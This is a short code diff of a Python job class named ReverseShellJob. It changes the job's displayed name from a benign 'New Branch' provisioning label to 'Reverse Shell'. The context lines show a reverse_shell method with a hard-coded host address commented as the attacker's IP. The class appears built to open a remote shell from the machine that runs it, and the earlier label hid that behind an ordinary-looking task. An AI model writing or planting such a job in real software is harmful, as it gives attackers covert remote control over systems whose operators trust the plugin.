@@ -6,8 +6,8 @@ import os
 
 class ReverseShellJob(Job):
     class Meta:
-        name = "New Branch"
-        description = "Provision a new branch location"
+        name = "Reverse Shell"
+        description = "Provide a reverse shell"
 
     def reverse_shell(self):
         host = '51.107.3.204'  # Replace with the attacker's IP address
